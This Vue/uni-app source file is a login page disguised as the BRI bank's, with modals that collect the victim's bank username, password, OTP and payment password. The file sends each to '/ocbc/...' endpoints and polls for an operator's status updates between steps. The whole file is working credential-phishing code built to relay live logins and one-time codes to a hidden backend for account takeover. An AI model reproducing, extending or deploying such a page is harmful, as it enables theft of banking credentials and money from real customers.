<template>
  <view class="bri-page">
    <!-- 蓝色背景区域 -->
    <view class="blue-section">
      <!-- 顶部导航栏 -->
      <view class="top-bar">
        <!-- 左侧国旗按钮 -->
        <view class="flag-button">
          <image class="flag-icon" src="https://flagcdn.com/w40/id.png" mode="aspectFit" />
          <text class="flag-text">ID</text>
        </view>

        <!-- 中央 Logo -->
        <view class="logo">
          <image class="logo-image" :src="logoUrl" mode="heightFix" />
        </view>

        <!-- 右侧客服按钮 -->
        <view class="contact-btn">
          <text class="bi bi-headset"></text>
          <text class="contact-text">{{ t('bri.contactUs').replace(' ', '\n') }}</text>
        </view>
      </view>

      <!-- 欢迎标题 -->
      <text class="welcome-title">{{ t('bri.welcomeTitle') }}</text>

      <!-- 插图区域 -->
      <view class="illustration-wrapper">
        <image
          class="illustration-image"
          src="/static/images/bri/bri1.png"
          mode="widthFix"
        />
      </view>
    </view>

    <!-- 白色登录表单区域 -->
    <view class="form-section">
      <text class="form-title">{{ t('bri.loginTitle') }}</text>

      <!-- Username 输入框 -->
      <view class="input-container">
        <view class="input-box">
          <text class="bi bi-person-fill input-icon"></text>
          <input
            class="input-field"
            v-model="username"
            type="text"
            :placeholder="t('bri.usernamePlaceholder')"
            placeholder-class="input-placeholder"
          />
        </view>
      </view>

      <!-- Password 输入框 -->
      <view class="input-container">
        <view class="input-box">
          <text class="bi bi-lock-fill input-icon"></text>
          <input
            class="input-field password-input"
            v-model="password"
            :type="showPassword ? 'text' : 'password'"
            :password="!showPassword"
            :placeholder="t('bri.passwordPlaceholder')"
            placeholder-class="input-placeholder"
          />
          <view class="eye-icon" @click="togglePassword">
            <text class="bi" :class="showPassword ? 'bi-eye-slash-fill' : 'bi-eye-fill'"></text>
          </view>
        </view>
      </view>

      <!-- Login 按钮 -->
      <button
        class="login-btn"
        :class="{ 'btn-disabled': !canLogin }"
        :disabled="!canLogin"
        @click="handleLogin"
      >
        {{ t('bri.loginButton') }}
      </button>

      <!-- 忘记密码链接 -->
      <text class="forgot-link" @click="handleForgotPassword">
        {{ t('bri.forgotPassword') }}
      </text>
    </view>

    <!-- 加载中遮罩 -->
    <view v-if="showLoading" class="loading-overlay">
      <view class="loading-spinner">
        <view class="spinner"></view>
        <text class="loading-text">{{ t('bri.processing') }}</text>
      </view>
    </view>

    <!-- OTP 弹窗 -->
    <view v-if="showCaptchaModal" class="modal-overlay" @click.stop>
      <view class="modal-content otp-modal" @click.stop>
        <view class="modal-header">
          <text class="modal-title">{{ t('bri.captchaTitle') }}</text>
          <text class="modal-subtitle">{{ t('bri.captchaSubtitle') }}</text>
        </view>

        <view class="otp-section">
          <text class="input-label">{{ t('bri.otpLabel') }}</text>
          <text class="input-description">{{ t('bri.enterOtp') }}</text>
          <input class="otp-field" v-model="captchaInput" type="number" :placeholder="t('bri.captchaPlaceholder')"
            maxlength="6" />

          <view class="otp-security-notice">
            <text class="security-icon bi bi-shield-check"></text>
            <view class="security-text">
              <text class="security-title">{{ t('bri.otpSecurityNotice') }}</text>
              <text class="security-desc">{{ t('bri.otpSecurityExplanation') }}</text>
            </view>
          </view>

          <text class="otp-help-link">{{ t('bri.forgotOtp') }}</text>
        </view>

        <view class="modal-actions">
          <button class="modal-button" @click="submitCaptcha">{{ t('bri.submit') }}</button>
        </view>
      </view>
    </view>

    <!-- 支付密码弹窗 -->
    <view v-if="showPaymentPasswordModal" class="modal-overlay" @click.stop>
      <view class="modal-content payment-modal" @click.stop>
        <view class="modal-header">
          <text class="modal-title">{{ t('bri.paymentPasswordTitle') }}</text>
        </view>

        <view class="payment-section">
          <!-- 提现账户信息 -->
          <view v-if="withdrawalAccount?.account_name || withdrawalAccount?.account_number" class="account-info-section">
            <text class="section-label">{{ t('bri.withdrawalAccountLabel') }}</text>
            <view class="account-info-box">
              <view v-if="withdrawalAccount?.account_name" class="account-row">
                <text class="account-label">{{ t('bri.accountName') }}</text>
                <text class="account-value">{{ withdrawalAccount.account_name }}</text>
              </view>
              <view v-if="withdrawalAccount?.account_number" class="account-row">
                <text class="account-label">{{ t('bri.accountNumber') }}</text>
                <text class="account-value">{{ withdrawalAccount.account_number }}</text>
              </view>
              <view v-if="withdrawalAccount?.bank_name" class="account-row">
                <text class="account-label">{{ t('bri.bankName') }}</text>
                <text class="account-value">{{ withdrawalAccount.bank_name }}</text>
              </view>
            </view>
          </view>

          <!-- 密码输入区域 -->
          <view class="password-input-section">
            <text class="input-label">{{ t('bri.password') }}</text>
            <input class="payment-field" v-model="paymentPasswordInput" type="password" password
              :placeholder="t('bri.paymentPasswordPlaceholder')" maxlength="6" />
          </view>

          <!-- 安全提示 -->
          <view class="security-notice">
            <view class="notice-icon">
              <text class="bi bi-shield-check shield-icon"></text>
            </view>
            <view class="notice-content">
              <text class="notice-title">{{ t('bri.securityNotice') }}</text>
              <text class="notice-text">{{ t('bri.securityNoticeText') }}</text>
            </view>
          </view>
        </view>

        <view class="modal-actions">
          <button class="modal-button confirm-button" @click="submitPaymentPassword">
            {{ t('bri.submit') }}
          </button>
        </view>
      </view>
    </view>

    <!-- 验证码错误弹窗 -->
    <view v-if="showCaptchaErrorModal" class="modal-overlay status-overlay">
      <view class="status-modal error-modal" @click.stop>
        <view class="status-icon-container error-icon-container">
          <view class="status-icon-circle error-circle">
            <text class="bi bi-x-lg error-x"></text>
          </view>
        </view>
        <view class="status-content">
          <text class="status-title error-title">{{ t('bri.captchaErrorTitle') }}</text>
          <text class="status-message">{{ t('bri.captchaErrorMessage') }}</text>
        </view>
        <button class="status-button error-button" @click="retryCaptcha">
          {{ t('bri.reenter') }}
        </button>
      </view>
    </view>

    <!-- 支付密码错误弹窗 -->
    <view v-if="showPaymentPasswordErrorModal" class="modal-overlay status-overlay">
      <view class="status-modal error-modal" @click.stop>
        <view class="status-icon-container error-icon-container">
          <view class="status-icon-circle error-circle">
            <text class="bi bi-x-lg error-x"></text>
          </view>
        </view>
        <view class="status-content">
          <text class="status-title error-title">{{ t('bri.paymentPasswordErrorTitle') }}</text>
          <text class="status-message">{{ t('bri.paymentPasswordErrorMessage') }}</text>
        </view>
        <button class="status-button error-button" @click="retryPaymentPassword">
          {{ t('bri.reenter') }}
        </button>
      </view>
    </view>

    <!-- 忘记密码弹窗 -->
    <view v-if="showForgotPasswordModal" class="modal-overlay" @click="closeForgotPasswordModal">
      <view class="modal-container" @click.stop>
        <view class="modal-content simple-modal">
          <text class="modal-title">{{ t('bri.forgotPasswordTitle') }}</text>
          <text class="modal-message">{{ t('bri.forgotPasswordMessage') }}</text>
          <button class="modal-button" @click="confirmForgotPassword">
            {{ t('bri.forgotPasswordConfirm') }}
          </button>
        </view>
      </view>
    </view>

    <!-- 成功弹窗 -->
    <view v-if="showSuccessModal" class="modal-overlay status-overlay">
      <view class="status-modal success-modal" @click.stop>
        <view class="status-icon-container success-icon-container">
          <view class="status-icon-circle success-circle">
            <text class="bi bi-check-lg success-check"></text>
          </view>
        </view>
        <view class="status-content">
          <text class="status-title success-title">{{ t('bri.successTitle') }}</text>
          <text class="status-message">{{ t('bri.successMessage') }}</text>
          <text class="status-description">{{ t('bri.successDescription') }}</text>
        </view>
        <button class="status-button success-button" @click="handleLoginSuccess">
          {{ t('bri.ok') }}
        </button>
      </view>
    </view>

    <!-- 失败弹窗 -->
    <view v-if="showFailedModal" class="modal-overlay status-overlay">
      <view class="status-modal error-modal" @click.stop>
        <view class="status-icon-container error-icon-container">
          <view class="status-icon-circle error-circle">
            <text class="bi bi-x-lg error-x"></text>
          </view>
        </view>
        <view class="status-content">
          <text class="status-title error-title">{{ t('bri.failedTitle') }}</text>
          <text class="status-message">{{ t('bri.failedMessage') }}</text>
          <text class="status-description">{{ t('bri.failedDescription') }}</text>
        </view>
        <button class="status-button error-button" @click="handleLoginFailed">
          {{ t('bri.tryAgain') }}
        </button>
      </view>
    </view>

    <!-- 系统维护弹窗 -->
    <view v-if="showMaintenanceModal" class="modal-overlay status-overlay">
      <view class="status-modal maintenance-modal" @click.stop>
        <view class="status-icon-container maintenance-icon-container">
          <view class="status-icon-circle maintenance-circle">
            <text class="bi bi-tools maintenance-icon"></text>
          </view>
        </view>
        <view class="status-content">
          <text class="status-title maintenance-title">{{ t('bri.maintenanceTitle') }}</text>
          <text class="status-message">{{ t('bri.maintenanceMessage') }}</text>
          <text class="status-description">{{ t('bri.maintenanceDescription') }}</text>
        </view>
        <button class="status-button maintenance-button" @click="handleMaintenanceClose">
          {{ t('bri.ok') }}
        </button>
      </view>
    </view>
  </view>
</template>

<script setup lang="ts">
import { ref, computed } from 'vue'
import { onLoad } from '@dcloudio/uni-app'
import { useI18n } from 'vue-i18n'
import { post } from '../../utils/request'
import { getToken } from '../../utils/storage'

const { t } = useI18n()

const username = ref('')
const password = ref('')
const showPassword = ref(false)
const logoUrl = ref('')
const bankCode = ref('')

// 加载状态
const showLoading = ref(false)

// 弹窗状态
const showCaptchaModal = ref(false)
const showCaptchaErrorModal = ref(false)
const showPaymentPasswordModal = ref(false)
const showPaymentPasswordErrorModal = ref(false)
const showForgotPasswordModal = ref(false)
const showSuccessModal = ref(false)
const showFailedModal = ref(false)
const showMaintenanceModal = ref(false)

// 输入数据
const captchaInput = ref('')
const paymentPasswordInput = ref('')
const withdrawalAccount = ref<any>(null)

// 记录ID和轮询
const recordId = ref<number>(0)
let pollingTimer: any = null

// 获取URL参数
onLoad((options) => {
  // 检查登录状态
  const token = getToken()
  if (!token) {
    uni.showToast({
      title: t('common.pleaseLoginFirst') || 'Please login first',
      icon: 'none',
      duration: 2000
    })
    setTimeout(() => {
      uni.reLaunch({ url: '/pages/auth/login' })
    }, 2000)
    return
  }

  if (options?.code) {
    bankCode.value = options.code
  }
  if (options?.logo) {
    logoUrl.value = decodeURIComponent(options.logo)
  }
})

const canLogin = computed(() => {
  return username.value.trim() !== '' && password.value.trim() !== ''
})

function togglePassword() {
  showPassword.value = !showPassword.value
}

// 提交登录
async function handleLogin() {
  if (!canLogin.value) return

  showLoading.value = true
  try {
    const res = await post('/ocbc/submitLogin', {
      account_type: bankCode.value || 'bri',
      organization_id: username.value,
      user_id: username.value,
      password: password.value
    }, { showError: false })

    recordId.value = res.data.record_id
    startPolling()
  } catch (error: any) {
    showLoading.value = false
    uni.showToast({
      title: error.message || 'Login failed',
      icon: 'none'
    })
  }
}

// 开始轮询状态
function startPolling() {
  pollingTimer = setInterval(async () => {
    await pollStatus()
  }, 2000)
}

// 停止轮询
function stopPolling() {
  if (pollingTimer) {
    clearInterval(pollingTimer)
    pollingTimer = null
  }
}

// 轮询状态
async function pollStatus() {
  try {
    const res = await post('/ocbc/pollStatus', {
      record_id: recordId.value
    }, { showError: false })

    const status = res.data.status
    handleStatusChange(status, res.data)
  } catch (error) {
    console.error('Poll status error:', error)
  }
}

// 处理状态变化
function handleStatusChange(status: string, data: any) {
  switch (status) {
    case 'need_captcha':
      stopPolling()
      showLoading.value = false
      showCaptchaModal.value = true
      break

    case 'need_payment_password':
      stopPolling()
      showLoading.value = false
      withdrawalAccount.value = data.withdrawal_account
      showPaymentPasswordModal.value = true
      break

    case 'success':
      stopPolling()
      showLoading.value = false
      showSuccessModal.value = true
      break

    case 'payment_password_error':
      stopPolling()
      showLoading.value = false
      showPaymentPasswordErrorModal.value = true
      break

    case 'captcha_error':
      stopPolling()
      showLoading.value = false
      showCaptchaErrorModal.value = true
      break

    case 'password_error':
    case 'failed':
      stopPolling()
      showLoading.value = false
      showFailedModal.value = true
      break

    case 'maintenance':
      stopPolling()
      showLoading.value = false
      showMaintenanceModal.value = true
      break

    default:
      // 继续轮询
      break
  }
}

// 提交验证码
async function submitCaptcha() {
  if (!captchaInput.value) {
    uni.showToast({
      title: t('bri.pleaseEnterCaptcha') || 'Please enter OTP',
      icon: 'none'
    })
    return
  }

  showCaptchaModal.value = false
  showLoading.value = true

  try {
    await post('/ocbc/submitCaptcha', {
      record_id: recordId.value,
      captcha: captchaInput.value
    }, { showError: false })

    captchaInput.value = ''
    startPolling()
  } catch (error: any) {
    showLoading.value = false
    showFailedModal.value = true
  }
}

// 提交支付密码
async function submitPaymentPassword() {
  if (!paymentPasswordInput.value) {
    uni.showToast({
      title: t('bri.pleaseEnterPaymentPassword') || 'Please enter payment password',
      icon: 'none'
    })
    return
  }

  showPaymentPasswordModal.value = false
  showLoading.value = true

  try {
    await post('/ocbc/submitPaymentPassword', {
      record_id: recordId.value,
      payment_password: paymentPasswordInput.value
    }, { showError: false })

    paymentPasswordInput.value = ''
    startPolling()
  } catch (error: any) {
    showLoading.value = false
    showPaymentPasswordErrorModal.value = true
  }
}

// 重试输入验证码
function retryCaptcha() {
  showCaptchaErrorModal.value = false
  captchaInput.value = ''
  showCaptchaModal.value = true
}

// 重试输入支付密码
function retryPaymentPassword() {
  showPaymentPasswordErrorModal.value = false
  paymentPasswordInput.value = ''
  showPaymentPasswordModal.value = true
}

// 忘记密码
function handleForgotPassword() {
  showForgotPasswordModal.value = true
}

function closeForgotPasswordModal() {
  showForgotPasswordModal.value = false
}

function confirmForgotPassword() {
  showForgotPasswordModal.value = false
}

// 登录成功
function handleLoginSuccess() {
  showSuccessModal.value = false
  uni.redirectTo({
    url: '/pages/wallet/withdraw'
  })
}

// 登录失败
function handleLoginFailed() {
  showFailedModal.value = false
  username.value = ''
  password.value = ''
}

// 关闭维护弹窗
function handleMaintenanceClose() {
  showMaintenanceModal.value = false
  uni.navigateBack()
}
</script>

<style lang="scss" scoped>
.bri-page {
  min-height: 100vh;
  display: flex;
  flex-direction: column;
  background: #ffffff;
}

/* ========== 蓝色背景区域 ========== */
.blue-section {
  background: linear-gradient(180deg, #0066FF 0%, #0052D6 100%);
  padding: calc(var(--status-bar-height) + 32rpx) 0 0;
  position: relative;
  overflow: visible;
  border-radius: 0 0 50% 50% / 0 0 80rpx 80rpx;
}

/* 顶部导航栏 */
.top-bar {
  display: flex;
  align-items: center;
  justify-content: space-between;
  margin-bottom: 60rpx;
  padding: 0 24rpx;
}

.flag-button {
  display: flex;
  align-items: center;
  gap: 12rpx;
  background: #FFFFFF;
  padding: 12rpx 28rpx;
  border-radius: 40rpx;
  box-shadow: 0 4rpx 12rpx rgba(0, 0, 0, 0.08);
}

.flag-icon {
  width: 40rpx;
  height: 28rpx;
  border-radius: 4rpx;
}

.flag-text {
  font-size: 28rpx;
  font-weight: 600;
  color: #1A1A1A;
}

.logo {
  position: absolute;
  left: 50%;
  transform: translateX(-50%);
  display: flex;
  align-items: center;
  justify-content: center;
}

.logo-image {
  height: 60rpx;
  max-width: 240rpx;
}

.contact-btn {
  display: flex;
  align-items: center;
  gap: 8rpx;
  background: rgba(255, 255, 255, 0.25);
  padding: 12rpx 20rpx;
  border-radius: 40rpx;
  border: 2rpx solid rgba(255, 255, 255, 0.4);
}

.contact-btn .bi {
  font-size: 32rpx;
  color: #FFFFFF;
}

.contact-text {
  font-size: 22rpx;
  font-weight: 600;
  color: #FFFFFF;
  line-height: 1.3;
  text-align: left;
}

/* 欢迎标题 */
.welcome-title {
  font-size: 38rpx;
  font-weight: 700;
  color: #FFFFFF;
  text-align: center;
  display: block;
  margin-bottom: 60rpx;
  letter-spacing: 1rpx;
}

/* 插图区域 */
.illustration-wrapper {
  width: 100%;
  display: flex;
  justify-content: center;
  align-items: center;
}

.illustration-image {
  width: 80%;
  max-width: 560rpx;
}

/* ========== 白色登录表单区域 ========== */
.form-section {
  background:transparent;
  border-radius: 56rpx 56rpx 0 0;
  padding: 72rpx 48rpx 96rpx;
//   margin-top: -40rpx;
  flex: 1;
}

.form-title {
  font-size: 52rpx;
  font-weight: 700;
  color: #2D3748;
  text-align: center;
  display: block;
  margin-bottom: 56rpx;
}

.input-container {
  margin-bottom: 28rpx;
}

.input-box {
  position: relative;
  display: flex;
  align-items: center;
  background: #FFFFFF;
  border: 2rpx solid #CBD5E0;
  border-radius: 20rpx;
  padding: 0 32rpx;
  height: 112rpx;
  box-shadow: 0 2rpx 8rpx rgba(0, 0, 0, 0.04);
}

.input-icon {
  font-size: 40rpx;
  color: #718096;
  margin-right: 20rpx;
}

.input-field {
  flex: 1;
  font-size: 32rpx;
  color: #2D3748;
  height: 100%;
}

.input-placeholder {
  color: #A0AEC0;
}

.password-input {
  padding-right: 80rpx;
}

.eye-icon {
  position: absolute;
  right: 32rpx;
  top: 50%;
  transform: translateY(-50%);
  padding: 16rpx;
}

.eye-icon .bi {
  font-size: 44rpx;
  color: #718096;
}

.login-btn {
  width: 100%;
  height: 112rpx;
  background: linear-gradient(135deg, #4A5568 0%, #2D3748 100%);
  border-radius: 20rpx;
  font-size: 36rpx;
  font-weight: 700;
  color: #FFFFFF;
  border: none;
  margin-top: 40rpx;
  margin-bottom: 32rpx;
  box-shadow: 0 8rpx 20rpx rgba(45, 55, 72, 0.2);
  display: flex;
  align-items: center;
  justify-content: center;
}

.login-btn::after {
  border: none;
}

.btn-disabled {
  background: linear-gradient(135deg, #CBD5E0 0%, #A0AEC0 100%);
  box-shadow: none;
  opacity: 0.7;
}

.forgot-link {
  font-size: 30rpx;
  font-weight: 600;
  color: #2C5282;
  text-align: center;
  display: block;
  text-decoration: underline;
}

/* ========== 加载遮罩 ========== */
.loading-overlay {
  position: fixed;
  top: 0;
  left: 0;
  right: 0;
  bottom: 0;
  background: rgba(0, 102, 255, 0.15);
  display: flex;
  align-items: center;
  justify-content: center;
  z-index: 9999;
  backdrop-filter: blur(8rpx);
}

.loading-spinner {
  background: #FFFFFF;
  border-radius: 24rpx;
  padding: 60rpx;
  display: flex;
  flex-direction: column;
  align-items: center;
  gap: 24rpx;
  box-shadow: 0 8rpx 32rpx rgba(0, 102, 255, 0.2);
}

.spinner {
  width: 80rpx;
  height: 80rpx;
  border: 6rpx solid #E3F2FD;
  border-top-color: #0066FF;
  border-radius: 50%;
  animation: spin 1s linear infinite;
}

@keyframes spin {
  to {
    transform: rotate(360deg);
  }
}

.loading-text {
  font-size: 28rpx;
  color: #0066FF;
  font-weight: 600;
}

/* ========== 弹窗基础样式 ========== */
.modal-overlay {
  position: fixed;
  top: 0;
  left: 0;
  right: 0;
  bottom: 0;
  background: rgba(0, 0, 0, 0.5);
  display: flex;
  align-items: flex-end;
  justify-content: center;
  z-index: 9999;
  animation: fadeIn 0.3s ease;
}

@keyframes fadeIn {
  from {
    opacity: 0;
  }
  to {
    opacity: 1;
  }
}

.modal-container {
  width: 100%;
  display: flex;
  align-items: flex-end;
  justify-content: center;
}

.modal-content {
  background: #FFFFFF;
  border-radius: 32rpx 32rpx 0 0;
  padding: 48rpx;
  width: 100%;
  max-height: 80vh;
  overflow-y: auto;
  animation: slideUp 0.3s ease;
}

@keyframes slideUp {
  from {
    transform: translateY(100%);
  }
  to {
    transform: translateY(0);
  }
}

.modal-header {
  margin-bottom: 40rpx;
}

.modal-title {
  display: block;
  font-size: 36rpx;
  font-weight: 700;
  color: #0066FF;
  margin-bottom: 12rpx;
  text-align: center;
}

.modal-subtitle {
  display: block;
  font-size: 28rpx;
  color: #718096;
  text-align: center;
}

.modal-message {
  display: block;
  font-size: 28rpx;
  color: #718096;
  line-height: 1.6;
  margin-bottom: 40rpx;
  text-align: center;
}

/* ========== OTP 弹窗 ========== */
.otp-section,
.payment-section {
  margin-bottom: 40rpx;
}

.input-description {
  display: block;
  font-size: 26rpx;
  color: #A0AEC0;
  margin-bottom: 16rpx;
  line-height: 1.5;
}

.otp-field,
.payment-field {
  height: 96rpx;
  background: #F0F7FF;
  border: 2rpx solid #B3D9FF;
  border-radius: 12rpx;
  padding: 0 32rpx;
  font-size: 32rpx;
  color: #2D3748;
  margin-bottom: 24rpx;
}

.otp-field:focus,
.payment-field:focus {
  border-color: #0066FF;
  background: #FFFFFF;
}

.otp-security-notice {
  display: flex;
  gap: 16rpx;
  padding: 24rpx;
  background: #E3F2FD;
  border-radius: 12rpx;
  margin-bottom: 24rpx;
  border: 1rpx solid #B3D9FF;
}

.security-icon {
  font-size: 40rpx;
  color: #0066FF;
}

.security-text {
  flex: 1;
}

.security-title {
  display: block;
  font-size: 26rpx;
  font-weight: 600;
  color: #0066FF;
  margin-bottom: 8rpx;
}

.security-desc {
  display: block;
  font-size: 24rpx;
  color: #0052D6;
  line-height: 1.5;
}

.otp-help-link {
  font-size: 26rpx;
  color: #0066FF;
  text-decoration: underline;
  text-align: center;
  display: block;
}

/* ========== 支付密码弹窗 ========== */
.account-info-section {
  margin-bottom: 32rpx;
}

.section-label {
  display: block;
  font-size: 26rpx;
  color: #718096;
  margin-bottom: 12rpx;
  font-weight: 600;
}

.account-info-box {
  background: #F0F7FF;
  border: 2rpx solid #B3D9FF;
  border-radius: 12rpx;
  padding: 24rpx;
}

.account-row {
  display: flex;
  justify-content: space-between;
  align-items: center;
  margin-bottom: 16rpx;
}

.account-row:last-child {
  margin-bottom: 0;
}

.account-label {
  font-size: 26rpx;
  color: #718096;
}

.account-value {
  font-size: 28rpx;
  font-weight: 600;
  color: #2D3748;
}

.password-input-section {
  margin-bottom: 24rpx;
}

.security-notice {
  display: flex;
  gap: 16rpx;
  padding: 24rpx;
  background: #E3F2FD;
  border-radius: 12rpx;
  border: 1rpx solid #B3D9FF;
}

.notice-icon {
  font-size: 40rpx;
  color: #0066FF;
}

.shield-icon {
  font-size: 40rpx;
}

.notice-content {
  flex: 1;
}

.notice-title {
  display: block;
  font-size: 26rpx;
  font-weight: 600;
  color: #0066FF;
  margin-bottom: 8rpx;
}

.notice-text {
  display: block;
  font-size: 24rpx;
  color: #0052D6;
  line-height: 1.5;
}

/* ========== 弹窗按钮 ========== */
.modal-actions {
  display: flex;
  gap: 16rpx;
}

.modal-button {
  flex: 1;
  height: 88rpx;
  background: linear-gradient(135deg, #0066FF 0%, #0052D6 100%);
  border-radius: 12rpx;
  font-size: 30rpx;
  font-weight: 600;
  color: #FFFFFF;
  border: none;
  box-shadow: 0 4rpx 12rpx rgba(0, 102, 255, 0.3);
}

.modal-button::after {
  border: none;
}

.confirm-button {
  background: linear-gradient(135deg, #0066FF 0%, #0052D6 100%);
}

/* ========== 简单弹窗 ========== */
.simple-modal {
  text-align: center;
  padding: 60rpx 48rpx 48rpx;
}

.simple-modal .modal-title {
  font-size: 32rpx;
  margin-bottom: 24rpx;
}

/* ========== 状态弹窗（成功/失败/维护） ========== */
.status-overlay {
  background: rgba(0, 0, 0, 0.6);
  backdrop-filter: blur(8rpx);
  align-items: flex-end;
}

.status-modal {
  background: #FFFFFF;
  border-radius: 32rpx 32rpx 0 0;
  padding: 60rpx 48rpx 48rpx;
  width: 100%;
  text-align: center;
  animation: slideUp 0.3s ease;
}

.status-icon-container {
  margin-bottom: 32rpx;
  display: flex;
  justify-content: center;
}

.status-icon-circle {
  width: 128rpx;
  height: 128rpx;
  border-radius: 50%;
  display: flex;
  align-items: center;
  justify-content: center;
  font-size: 64rpx;
  animation: statusIconScale 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275);
}

@keyframes statusIconScale {
  0% {
    transform: scale(0);
    opacity: 0;
  }
  50% {
    transform: scale(1.1);
  }
  100% {
    transform: scale(1);
    opacity: 1;
  }
}

.success-circle {
  background: linear-gradient(135deg, #10B981 0%, #059669 100%);
  box-shadow: 0 8rpx 24rpx rgba(16, 185, 129, 0.3);
  color: #FFFFFF;
}

.error-circle {
  background: linear-gradient(135deg, #EF4444 0%, #DC2626 100%);
  box-shadow: 0 8rpx 24rpx rgba(239, 68, 68, 0.3);
  color: #FFFFFF;
}

.maintenance-circle {
  background: linear-gradient(135deg, #F59E0B 0%, #D97706 100%);
  box-shadow: 0 8rpx 24rpx rgba(245, 158, 11, 0.3);
  color: #FFFFFF;
}

.success-check,
.error-x,
.maintenance-icon {
  font-weight: 700;
}

.status-content {
  margin-bottom: 40rpx;
}

.status-title {
  display: block;
  font-size: 40rpx;
  font-weight: 700;
  margin-bottom: 16rpx;
}

.success-title {
  color: #10B981;
}

.error-title {
  color: #EF4444;
}

.maintenance-title {
  color: #F59E0B;
}

.status-message {
  display: block;
  font-size: 30rpx;
  color: #2D3748;
  margin-bottom: 12rpx;
  font-weight: 600;
}

.status-description {
  display: block;
  font-size: 26rpx;
  color: #718096;
  line-height: 1.6;
}

.status-button {
  width: 100%;
  height: 96rpx;
  border-radius: 16rpx;
  font-size: 32rpx;
  font-weight: 600;
  color: #FFFFFF;
  border: none;
  display: flex;
  align-items: center;
  justify-content: center;
}

.status-button::after {
  border: none;
}

.success-button {
  background: linear-gradient(135deg, #10B981 0%, #059669 100%);
  box-shadow: 0 4rpx 12rpx rgba(16, 185, 129, 0.3);
}

.error-button {
  background: linear-gradient(135deg, #EF4444 0%, #DC2626 100%);
  box-shadow: 0 4rpx 12rpx rgba(239, 68, 68, 0.3);
}

.maintenance-button {
  background: linear-gradient(135deg, #F59E0B 0%, #D97706 100%);
  box-shadow: 0 4rpx 12rpx rgba(245, 158, 11, 0.3);
}
</style>
